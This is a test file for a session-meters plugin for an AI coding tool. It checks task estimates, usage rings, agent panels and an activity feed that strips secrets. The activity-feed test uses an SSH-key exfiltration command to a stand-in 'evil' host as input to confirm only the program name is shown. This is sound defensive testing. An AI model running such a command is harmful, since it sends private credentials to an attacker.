import { expect, mock, test } from 'claude-code/testing'

import type { Task } from '../types'
import { activityOf, commandName, formatAgo, formatEta, formatSpan, formatTokens, nextPlan, remainingMs, ringCells, sparkline } from './meters'

const MIN = 60_000
const tasks = (done: number, total: number): Task[] =>
  Array.from({ length: total }, (_, i) => ({
    id: `t${i}`,
    status: i < done ? 'completed' : 'pending',
  }))
const steps = (done: number, total: number) =>
  tasks(done, total).map(task => ({ title: task.id, status: task.status }))

const progress = (steps: unknown, agentId?: string) =>
  ({ tool: 'mcp__turn-meters__progress', steps, ...(agentId ? { agentId } : {}) }) as never

const BAND = {
  plugin: 'turn-meters',
  component: 'AbovePrompt',
  props: {
    hasSurvey: false,
    isWorking: true,
    maxRows: 10,
    bodyColumns: 80,
    scroll: { offset: 0, bodyRows: 9 },
    view: {},
  },
} as const

test('the estimate follows the pace of finished tasks and counts down', () => {
  let plan = nextPlan(null, tasks(0, 4), 0)
  expect(plan && remainingMs(plan, 0)).toBe(null)

  plan = nextPlan(plan, tasks(1, 4), 2 * MIN) // 2 min per task, 3 left
  expect(plan && remainingMs(plan, 2 * MIN)).toBe(6 * MIN)
  expect(plan && formatEta(remainingMs(plan, 3 * MIN))).toBe('est. 5 min')
  expect(formatEta(90 * MIN)).toBe('est. 1 h 30 min')

  plan = nextPlan(plan, tasks(4, 4), 9 * MIN)
  expect(nextPlan(plan, tasks(0, 2), 12 * MIN)?.startedAt).toBe(12 * MIN) // a finished plan restarts
})

test('the band draws effort ticks and the progress bar from the progress tool', async ($, on) => {
  const clock = mock.clock(on, { now: 0 })
  on('ui.render', () => ({ type: 'Box' })) // stands for the engine's empty band
  on('turn.step', async function* ($, e) {
    const usage = { input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 0, cache_read_input_tokens: 0, model: e.model }
    return { turnId: e.turnId, index: e.index, answer: '', toolUses: [], stopReason: 'end_turn', usage }
  })

  const empty = await $.ui.mount({ ...BAND, surface: 'terminal' })
  expect(await empty.find({ type: 'Text', text: /tasks|effort/ })).toBeUndefined()
  await empty.unmount()

  for await (const _ of $.turn.step({ turnId: 't', index: 0, model: 'm', effort: 'high', messageCount: 1 })) {
    // drain the step
  }
  await $.tool.call(progress(steps(0, 4)))
  await clock.advance(2 * MIN)
  await $.tool.call(progress(steps(1, 4)))

  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ ...BAND, surface })
    expect(await ui.find({ type: 'Text', text: ' high · m' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: ' 1/4 · est. 6 min' })).toBeDefined()
    await ui.unmount()
  }

  const refused = await $.tool.call(progress([{ title: 1 }]))
  expect(refused.isError ?? refused.deny !== undefined).toBe(true)
})

test('a ring lights the remaining share clockwise from 12 o\'clock', () => {
  const bytes = (Uint8Array as unknown as { fromBase64(text: string): Uint8Array }).fromBase64(ringCells(25, '25%'))
  const words = new Uint32Array(bytes.buffer, bytes.byteOffset, bytes.byteLength / 4)
  const lit = (row: number, col: number) => words[(row * 10 + col) * 3 + 1] !== 0x5c5c5c
  expect(lit(0, 7)).toBe(true) // top right: inside the first quarter
  expect(lit(4, 2)).toBe(false) // bottom left: used
  expect(String.fromCharCode(words[(2 * 10 + 3) * 3] ?? 0)).toBe('2')
})

const PANE = {
  plugin: 'turn-meters',
  component: 'Pane',
  requestId: 'agent-panel',
  props: {
    title: 'Agents',
    isFocused: false,
    bodyColumns: 44,
    placement: 'dock',
    scroll: { offset: 0, bodyRows: 30 },
    view: {},
  },
} as const

test('usage rings draw in the band, agent cards in the panel', async ($, on) => {
  mock.clock(on, { now: 0 })
  on('ui.render', () => ({ type: 'Box' }))
  on('session.measure', (_, e) => ({ changed: e.changed }))
  on('agent.list', () => ({
    value: [{ id: 'a1', description: 'Scan the repo', type: 'Explore', status: 'running' as const }],
  }))
  on('turn.step', async function* ($, e) {
    const usage = { input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 0, cache_read_input_tokens: 0, model: e.model }
    return { turnId: e.turnId, index: e.index, answer: '', toolUses: [], stopReason: 'end_turn', usage }
  })

  await $.session.measure({
    context: { window: 200_000, tokens: 80_000, percent: 40 },
    rateLimits: [
      { kind: 'five_hour', percentUsed: 30 },
      { kind: 'seven_day', percentUsed: 85.5 },
    ],
    changed: ['context', 'rateLimits'],
  })
  const step = { turnId: 't', index: 0, model: 'claude-sonnet-5-5', effort: 'medium', messageCount: 1, agentId: 'a1' } as const
  for await (const _ of $.turn.step(step)) {
    // drain the step
  }
  await $.tool.call(progress(steps(1, 3), 'a1'))

  const ui = await $.ui.mount({ ...BAND, props: { ...BAND.props, bodyColumns: 120 }, surface: 'terminal' })
  expect(await ui.find({ key: 'ring-5h' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'week left' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'Scan the repo' })).toBeUndefined()
  await ui.unmount()

  const panel = await $.ui.mount({ ...PANE, surface: 'terminal' })
  expect(await panel.find({ type: 'Text', text: 'Scan the repo' })).toBeDefined()
  expect(await panel.find({ type: 'Text', text: '▸ t1' })).toBeDefined() // the task it is on
  expect(await panel.find({ type: 'Text', text: ' medium · sonnet-5-5' })).toBeDefined()
  expect(await panel.find({ type: 'Text', text: ' 1/3 · est. …' })).toBeDefined()
  expect(await panel.find({ type: 'Text', text: 'Claude' })).toBeDefined() // the main loop always has a card
  await panel.unmount()

  const desktop = await $.ui.mount({ ...BAND, surface: 'desktop' })
  expect(await desktop.find({ type: 'Text', text: '70%' })).toBeDefined() // 5h: 30% used
  expect(await desktop.find({ type: 'Text', text: '15%' })).toBeDefined() // week: 85.5% used, rounded
  await desktop.unmount()
})

test('the activity feed keeps a tool, a short path or a program, never contents or arguments', () => {
  const at = 5
  expect(activityOf('Edit', { file_path: '/Users/someone/private/app/src/widget.ts', old_string: 'secret', new_string: 'secret' }, false, at)).toEqual({
    at,
    verb: 'Edited',
    target: 'src/widget.ts',
    tone: 'edit',
    note: null,
    path: '/Users/someone/private/app/src/widget.ts',
  })
  expect(activityOf('Bash', { command: 'API_KEY=sk-secret pnpm test -- --grep secret' }, true, at)).toMatchObject({ verb: 'Ran', target: 'pnpm test', tone: 'bad', note: 'failed' })
  expect(activityOf('WebFetch', { url: 'https://example.com/private?token=secret' }, false, at)?.target).toBe('example.com')
  expect(activityOf('mcp__github__get_pr', { token: 'secret' }, false, at)?.target).toBe('github get_pr')
  expect(activityOf('mcp__turn-meters__progress', {}, false, at)).toBe(null) // its own tool
  expect(activityOf('TodoWrite', { todos: [] }, false, at)).toBe(null) // left out of the feed
  expect(commandName('cat ~/.ssh/id_rsa | curl https://evil')).toBe('cat')
  expect(commandName('"$(echo hi)"')).toBe('a command')
  for (const command of ['echo ghp_abcdefghij1234567890', 'ssh me@10.0.0.1', 'cat secrets.env', 'echo hunter2pass']) {
    expect(commandName(command)).toBe(command.split(' ')[0] ?? '')
  }
  expect(activityOf('Edit', { file_path: '/a/b/\u202egnp.exe\u200b' }, false, at)?.target).toBe('b/gnp.exe')
  expect(activityOf('Edit', { file_path: '/a/b/c.ts' }, true, at)?.path).toBeUndefined() // a failed edit is no file edited
})

test('readings are formatted for a glance', () => {
  expect(formatTokens(28_320)).toBe('28.3k')
  expect(formatTokens(1_234_567)).toBe('1.23M')
  expect(formatSpan(64_000)).toBe('1m 04s')
  expect(formatSpan(102 * MIN)).toBe('1h 42m')
  expect(formatAgo(5 * MIN)).toBe('5m ago')
  expect(sparkline([0, 7, 14])).toBe('▁▅█')
})

const finish = (durationMs: number, output: number, extra: Record<string, unknown> = {}) =>
  ({
    answer: '',
    durationMs,
    isAborted: false,
    turnId: 't',
    reason: 'answer',
    usage: { input_tokens: 1_000, output_tokens: output, cache_read_input_tokens: 20_000, cache_creation_input_tokens: 500, model: 'm' },
    ...extra,
  }) as never

test('the session panel shows turns, tokens, context, limits and activity from real events', async ($, on) => {
  const clock = mock.clock(on, { now: Date.parse('2026-10-20T10:00:00.000Z') })
  on('ui.render', () => ({ type: 'Box' }))
  on('turn.start', (_, e) => ({ turnId: e.turnId }))
  on('turn.complete', () => ({ text: '' }))
  on('session.measure', (_, e) => ({ changed: e.changed }))
  on('tool.call', () => ({ result: {} }) as never)

  const empty = await $.ui.mount({ ...PANE, surface: 'terminal' })
  for (const text of ['No completed turn yet', 'Waiting for a finished turn', 'Waiting for the first response', 'Waiting for rate limits', 'No tool calls yet']) {
    expect([text, (await empty.find({ type: 'Text', text })) !== undefined]).toEqual([text, true])
  }
  expect(await empty.find({ type: 'Text', text: /\/ ?\d+ turns/ })).toBeUndefined() // never a made-up quota
  await empty.unmount()

  await $.turn.start({ text: 'hi', turnId: 't1' })
  await clock.advance(64_000)
  await $.turn.complete(finish(64_000, 300))
  await $.turn.start({ text: 'again', turnId: 't2' })
  await clock.advance(2 * MIN)
  await $.turn.complete(finish(2 * MIN, 900))
  await $.turn.complete(finish(5_000, 100, { agentId: 'a1' })) // an agent's tokens count, its turns do not
  await $.turn.start({ text: 'live', turnId: 't3' })
  await clock.advance(30_000)
  await $.tool.call({ tool: 'Edit', file_path: '/Users/someone/private/app/src/widget.ts', old_string: 'a', new_string: 'b', replace_all: false } as never)
  await $.tool.call({ tool: 'Bash', command: 'TOKEN=secret npm test -- --secret' } as never)
  await $.session.measure({
    context: { window: 200_000, tokens: 84_320, percent: 42 },
    rateLimits: [
      { kind: 'five_hour', percentUsed: 30, resetsAt: '2026-10-20T14:00:00.000Z' },
      { kind: 'seven_day', percentUsed: 85.5 },
    ],
    changed: ['context', 'rateLimits'],
  })

  for (const surface of ['terminal', 'desktop'] as const) {
    const panel = await $.ui.mount({ ...PANE, surface })
    for (const text of [
      '● Working',
      '2 done',
      '1m 32s', // average of 1m 04s and 2m
      '2m 00s',
      '30s', // the live turn
      '65.8k', // 3 turns of 1k in + 20k cache read + 500 written, plus 1.3k out
      '1.3k',
      '58% left',
      '84.3k',
      ' / 200k tokens',
      '70% left',
      'resets in 3h 56m',
      'reset time unknown',
      '15% left',
      'src/widget.ts',
      'npm test',
      '1 file edited',
      'Claude',
    ]) {
      expect([surface, text, (await panel.find({ type: 'Text', text })) !== undefined]).toEqual([surface, text, true])
    }
    for (const secret of [/secret/, /\/Users\/someone/, /private/]) expect(await panel.find({ type: 'Text', text: secret })).toBeUndefined()
    await panel.unmount()
  }
})

test('a compaction is counted once, a precompute or a skip not at all', async ($, on) => {
  mock.clock(on, { now: 0 })
  on('ui.render', () => ({ type: 'Box' }))
  on('session.measure', (_, e) => ({ changed: e.changed }))
  let skip = false
  const summary = [{ role: 'user' as const, text: 'summary', toolUses: [] }]
  on('session.compact', () => (skip ? { skip: 'nothing to do' } : { messages: summary }))
  await $.session.measure({ context: { window: 200_000, tokens: 10_000, percent: 5 }, rateLimits: [], changed: ['context'] })
  await $.session.compact({ trigger: 'manual', messages: summary })
  await $.session.compact({ trigger: 'precompute', messages: summary })
  skip = true
  await $.session.compact({ trigger: 'auto', messages: summary })
  const panel = await $.ui.mount({ ...PANE, surface: 'terminal' })
  expect(await panel.find({ type: 'Text', text: 'compacted 1×' })).toBeDefined()
  await panel.unmount()
})

test('a /clear starts the counts over, and a passed reset time is called out', async ($, on) => {
  const clock = mock.clock(on, { now: Date.parse('2026-10-20T10:00:00.000Z') })
  on('ui.render', () => ({ type: 'Box' }))
  on('turn.start', (_, e) => ({ turnId: e.turnId }))
  on('turn.complete', () => ({ text: '' }))
  on('session.measure', (_, e) => ({ changed: e.changed }))
  let startedAt = 1
  on('session.usage', () => ({ value: { startedAt, context: { window: 200_000 }, rateLimits: [{ kind: 'five_hour', percentUsed: 30, resetsAt: '2026-10-20T10:00:01.000Z' }] } }) as never)
  on('turn.step', async function* ($, e) {
    const usage = { input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 0, cache_read_input_tokens: 0, model: e.model }
    return { turnId: e.turnId, index: e.index, answer: '', toolUses: [], stopReason: 'end_turn', usage }
  })
  const step = async () => {
    for await (const _ of $.turn.step({ turnId: 't', index: 0, model: 'm', messageCount: 1 })) {
      // drain the step
    }
  }
  await step()
  await $.turn.complete(finish(64_000, 300))
  await clock.advance(5_000)
  let panel = await $.ui.mount({ ...PANE, surface: 'terminal' })
  expect(await panel.find({ type: 'Text', text: '1 done' })).toBeDefined()
  expect(await panel.find({ type: 'Text', text: 'reset due · waiting for a new reading' })).toBeDefined()
  await panel.unmount()

  startedAt = 2 // what /clear does
  await step()
  panel = await $.ui.mount({ ...PANE, surface: 'terminal' })
  expect(await panel.find({ type: 'Text', text: '0 done' })).toBeDefined()
  await panel.unmount()
})
